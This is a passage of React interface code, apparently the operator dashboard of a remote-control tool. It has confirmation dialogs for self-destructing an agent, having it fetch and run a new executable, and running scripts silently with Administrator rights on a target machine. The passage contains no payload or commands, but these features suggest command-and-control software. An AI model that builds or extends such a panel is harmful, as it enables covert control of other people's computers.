                    <AlertTriangle className="w-4 h-4" />
                    PROCEED
                  </button>
                </div>
              </>
            )}

            {destructStep === 2 && (
              <>
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-10 h-10 rounded-xl bg-red-600/20 border border-red-500/30 flex items-center justify-center animate-pulse">
                    <Skull className="w-5 h-5 text-red-400" />
                  </div>
                  <div>
                    <h3 className="text-base font-mono font-bold text-red-400">FINAL CONFIRM — 2/2</h3>
                    <p className="text-[10px] text-red-400/60 font-mono">IRREVERSIBLE</p>
                  </div>
                </div>
                <div className="my-4 p-3 rounded-lg bg-red-500/10 border border-red-500/20 text-xs text-red-400/80 font-mono text-center tracking-widest">
                  {destructTarget} → WILL BE DESTROYED
                </div>
                <div className="flex gap-3">
                  <button onClick={cancelDestruct} className="btn-ghost flex-1">Abort</button>
                  <button
                    onClick={executeDestruct}
                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg text-sm font-mono font-bold
                               bg-red-600 hover:bg-red-500 text-white
                               border border-red-500 hover:border-red-400 transition-all
                               active:scale-[0.98] tracking-widest"
                  >
                    <Skull className="w-4 h-4" />
                    DESTROY
                  </button>
                </div>
              </>
            )}

            {destructStep === 3 && (
              <div className="flex flex-col items-center py-4">
                <Loader2 className="w-8 h-8 animate-spin text-red-400 mb-3" />
                <p className="text-xs text-cyan-400 font-mono tracking-widest">SENDING DESTRUCT SIGNAL...</p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Self-Destruct Toast */}
      {destructToast && (
        <div className="fixed bottom-6 right-6 bg-[#0b1221] border border-red-500/30 rounded-xl px-5 py-3.5 text-sm font-mono
                        shadow-2xl shadow-red-500/10 z-50 text-red-400 animate-slide-up">
          {destructToast}
        </div>
      )}

      {/* ══ UPDATE CONFIRMATION MODAL ══ */}
      {updateStep > 0 && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fade-in">
          <div className="bg-[#0b1221] border border-cyan-500/30 rounded-2xl p-6 w-full max-w-md shadow-2xl shadow-cyan-500/10">
            {updateStep === 1 && (
              <>
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-500/25 flex items-center justify-center">
                    <RefreshCw className="w-5 h-5 text-cyan-400" />
                  </div>
                  <div>
                    <h3 className="text-base font-mono font-bold text-cyan-400">CONFIRM UPDATE</h3>
                    <p className="text-[10px] text-cyan-600 font-mono">"{updateTarget}" will be updated</p>
                  </div>
                </div>
                <p className="text-sm text-cyan-400 mb-5 font-mono">
                  The agent on <strong className="text-cyan-300">{updateTarget}</strong> will fetch the new executable from the provided link and restart in the background.
                </p>
                <div className="flex gap-3">
                  <button onClick={cancelUpdate} className="btn-ghost flex-1">Cancel</button>
                  <button
                    onClick={executeUpdate}
                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg text-xs font-mono font-bold
                               bg-cyan-500/15 hover:bg-cyan-500/25 text-cyan-400 hover:text-cyan-300
                               border border-cyan-500/25 hover:border-cyan-500/40 transition-all tracking-wider"
                  >
                    <RefreshCw className="w-4 h-4" />
                    CONFIRM
                  </button>
                </div>
              </>
            )}

            {updateStep === 2 && (
              <div className="flex flex-col items-center py-4">
                <Loader2 className="w-8 h-8 animate-spin text-cyan-400 mb-3" />
                <p className="text-xs text-cyan-400 font-mono tracking-widest">SENDING UPDATE SIGNAL...</p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Update Toast */}
      {updateToast && (
        <div className="fixed bottom-6 right-6 bg-[#0b1221] border border-cyan-500/30 rounded-xl px-5 py-3.5 text-sm font-mono
                        shadow-2xl shadow-cyan-500/10 z-50 text-cyan-400 animate-slide-up">
          {updateToast}
        </div>
      )}

      {/* ══ CODE EXECUTION CONFIRMATION MODAL ══ */}
      {codeStep > 0 && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fade-in">
          <div className="bg-[#0b1221] border border-cyan-500/30 rounded-2xl p-6 w-full max-w-md shadow-2xl shadow-cyan-500/10">
            {codeStep === 1 && (
              <>
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-500/25 flex items-center justify-center">
                    <Terminal className="w-5 h-5 text-cyan-400" />
                  </div>
                  <div>
                    <h3 className="text-base font-mono font-bold text-cyan-400">CONFIRM EXECUTION</h3>
                    <p className="text-[10px] text-cyan-600 font-mono">"{codeTarget}" will execute the script</p>
                  </div>
                </div>
                <p className="text-sm text-cyan-400 mb-5 font-mono">
                  The script will run silently in the background on <strong className="text-cyan-300">{codeTarget}</strong> with Administrator permissions.
                </p>
                <div className="flex gap-3">
                  <button onClick={cancelCode} className="btn-ghost flex-1">Cancel</button>
                  <button
                    onClick={executeCode}
                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg text-xs font-mono font-bold
                               bg-cyan-500/15 hover:bg-cyan-500/25 text-cyan-400 hover:text-cyan-300
                               border border-cyan-500/25 hover:border-cyan-500/40 transition-all tracking-wider"
                  >
                    <Terminal className="w-4 h-4" />
                    CONFIRM
                  </button>
                </div>
              </>
            )}

            {codeStep === 2 && (
              <div className="flex flex-col items-center py-4">
                <Loader2 className="w-8 h-8 animate-spin text-cyan-400 mb-3" />
                <p className="text-xs text-cyan-400 font-mono tracking-widest">SENDING EXECUTE SIGNAL...</p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Code Toast */}
      {codeToast && (
        <div className="fixed bottom-6 right-6 bg-[#0b1221] border border-cyan-500/30 rounded-xl px-5 py-3.5 text-sm font-mono
                        shadow-2xl shadow-cyan-500/10 z-50 text-cyan-400 animate-slide-up">
          {codeToast}
        </div>
      )}
    </div>
  )
}
